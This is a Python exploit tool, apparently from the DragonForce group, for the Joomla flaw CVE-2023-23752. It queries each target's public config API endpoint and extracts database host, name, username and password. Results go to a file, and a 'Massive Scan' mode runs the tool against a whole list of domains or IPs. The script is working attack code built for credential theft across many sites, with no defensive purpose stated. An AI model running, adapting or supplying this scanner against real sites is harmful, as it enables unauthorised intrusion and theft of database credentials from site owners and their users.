# Author: Pari Malam

import requests, sys, os, re, colorama, urllib3
from sys import stdout
from colorama import Fore, Style, Back, init
init(autoreset=True)
delete_warning = urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   @DRAGONFORCE.IO                               "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[CVE-2023-23752] - {Fore.GREEN}Authentication Bypass Information Leak on Joomla!")
banners()

def scan_single_url(url=None):
    if url is None:
        url = input(f"\n{Fore.YELLOW}IP/Domain: {Fore.RESET}")

    if not url.startswith('https://') and not url.startswith('http://'):
        full_url = 'http://' + url
    else:
        full_url = url

    print(f"\n{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.GREEN}[Scanning!]")
    try:
        headers = {
            "Host": url,
            "content-type": "application/vnd.api+json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        }
        response = requests.get(full_url, headers=headers, verify=True, timeout=10)
        config_url = full_url + '/api/index.php/v1/config/application?public=true' #/api/index.php/v1/users?public=true
        config_response = requests.get(config_url)
        if config_response.status_code == 200 and b'dbtype' in config_response.content:
            decoded_content = config_response.content.decode()
            if 'dbtype' in decoded_content:
                dbtype = re.findall('"dbtype":"(.*?)"', decoded_content)[0]
                dbprefix = re.findall('"dbprefix":"(.*?)"', decoded_content)[0]
                host = re.findall('"host":"(.*?)"', decoded_content)[0]
                db = re.findall('"db":"(.*?)"', decoded_content)[0]
                user = re.findall('"user":"(.*?)"', decoded_content)[0]
                password = re.findall('"password":"(.*?)"', decoded_content)[0]

                print(f"{Fore.YELLOW}\n[+] Domain            : {Fore.GREEN}{url}")
                print(f"{Fore.YELLOW}[+] Database Type     : {Fore.GREEN}{dbtype}")
                print(f"{Fore.YELLOW}[+] Database Prefix   : {Fore.GREEN}{dbprefix}")
                print(f"{Fore.YELLOW}[+] Database          : {Fore.GREEN}{db}")
                print(f"{Fore.YELLOW}[+] Hostname          : {Fore.GREEN}{host}")
                print(f"{Fore.YELLOW}[+] Username          : {Fore.GREEN}{user}")
                print(f"{Fore.YELLOW}[+] Password          : {Fore.GREEN}{password}\n")

                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"[+] {url}\nDatabase Type     : {dbtype}\nDatabase Prefix   : {dbprefix}\nHostname          : {host}\nDatabase          : {db}\nUsername          : {user}\nPassword          : {password}\n\n")

                return decoded_content, True
    except Exception as e:
        print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[Failed!]")

    return '', False

def scan_multiple_urls():
    url_list = input(f"\n{Fore.RED}[+] {Fore.YELLOW}IP/DOMAIN List: {Fore.RESET}")
    urls = []

    if not os.path.exists("Results"):
        os.makedirs("Results")
    with open(url_list, "r") as f:
        for url in f:
            url = url.strip()
            if not url.startswith('https://') and not url.startswith('http://'):
                url = 'http://' + url

            if re.match(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", url):
                url_file_name = f"Results/IPs_{url}.txt"
            else:
                url_file_name = re.sub(r"https?://", "", url).rstrip("/") + ".txt"

            url_file_path = f"Results/{url_file_name}"
            response, sensitive_matches = scan_single_url(url.strip())

            if sensitive_matches:
                decoded_content = response
                dbtype = re.findall('"dbtype":"(.*?)"', decoded_content)[0]
                dbprefix = re.findall('"dbprefix":"(.*?)"', decoded_content)[0]
                host = re.findall('"host":"(.*?)"', decoded_content)[0]
                db = re.findall('"db":"(.*?)"', decoded_content)[0]
                user = re.findall('"user":"(.*?)"', decoded_content)[0]
                password = re.findall('"password":"(.*?)"', decoded_content)[0]
                with open(url_file_path, "w", encoding="utf-8") as f:
                    f.write(decoded_content)

                with open('Results/Configurations.txt', 'a') as f:
                    f.write(f"[+] {url}\nDatabase Type     : {dbtype}\nDatabase Prefix   : {dbprefix}\nHostname          : {host}\nDatabase          : {db}\nUsername          : {user}\nPassword          : {password}\n\n")
            elif response:
                print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[No Sensitive Information!]")
            else:
                print(f"{Fore.YELLOW}[CVE-2023-23752]{Fore.RED} - {Fore.WHITE}{url}{Fore.RED} .: {Fore.RED}[Error!]")
            
            urls.append(url)

    return urls

if __name__ == '__main__':
    choice = input(f"\n{Fore.RED}[1] - {Fore.YELLOW}Single Scan\n{Fore.RED}[2] - {Fore.YELLOW}Massive Scan\n\n{Fore.YELLOW}[CVE-2023-23752]: {Fore.WHITE}")
    if choice == '1':
        response, sensitive_matches = scan_single_url()
    elif choice == '2':
        (scan_single_url, scan_multiple_urls())
    else:
        print(f"\n{Fore.RED}Invalid option selected")
